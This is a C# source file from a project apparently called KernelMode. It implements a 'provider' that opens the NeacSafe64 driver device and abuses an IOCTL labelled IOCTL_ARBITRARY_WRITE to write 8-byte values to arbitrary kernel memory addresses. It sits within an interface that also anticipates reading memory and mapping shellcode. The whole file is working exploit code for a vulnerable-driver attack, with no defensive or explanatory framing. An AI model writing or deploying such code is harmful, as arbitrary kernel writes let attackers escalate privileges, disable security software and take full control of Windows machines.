// File: Providers/NeacSafeProvider.cs
// Project: KernelMode

using System;
using System.Runtime.InteropServices;
using Microsoft.Win32.SafeHandles;
using KernelMode.Providers;
using KernelMode.Utils;

namespace KernelMode.Providers
{
	public class NeacSafeProvider : IProvider
	{
		private const string DeviceName = "\\\\.\\NeacSafe64";
		private const uint IOCTL_ARBITRARY_WRITE = 0x22200B;

		private SafeFileHandle _handle;
		public bool IsInitialized { get; private set; }

		[StructLayout(LayoutKind.Sequential)]
		private struct WriteRequest
		{
			public ulong Address;
			public ulong Value;
		}

		public bool Initialize()
		{
			_handle = NativeMethods.CreateFile(DeviceName,
				NativeMethods.GENERIC_READ | NativeMethods.GENERIC_WRITE,
				0, IntPtr.Zero, NativeMethods.OPEN_EXISTING,
				0, IntPtr.Zero);

			IsInitialized = !_handle.IsInvalid && !_handle.IsClosed;
			return IsInitialized;
		}

		public bool ReadMemory(ulong address, byte[] buffer, int size)
		{
			Console.WriteLine("[-] NeacSafe does not support read.");
			return false;
		}

		public bool WriteMemory(ulong address, byte[] buffer, int size)
		{
			if (!IsInitialized || size != 8)
			{
				Console.WriteLine("[-] NeacSafe only supports 8-byte writes.");
				return false;
			}

			ulong value = BitConverter.ToUInt64(buffer, 0);
			var req = new WriteRequest { Address = address, Value = value };

			IntPtr reqPtr = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(WriteRequest)));
			Marshal.StructureToPtr(req, reqPtr, false);

			int bytesReturned;
			bool result = NativeMethods.DeviceIoControl(
				_handle,
				IOCTL_ARBITRARY_WRITE,
				reqPtr,
				Marshal.SizeOf(typeof(WriteRequest)),
				IntPtr.Zero,
				0,
				out bytesReturned,
				IntPtr.Zero);

			Marshal.FreeHGlobal(reqPtr);
			return result;
		}

		public bool MapShellcode(byte[] shellcode, ulong param)
		{
			Console.WriteLine("[-] NeacSafe does not support direct shellcode mapping.");
			return false;
		}

		public void Dispose()
		{
			_handle?.Dispose();
		}
	}
}
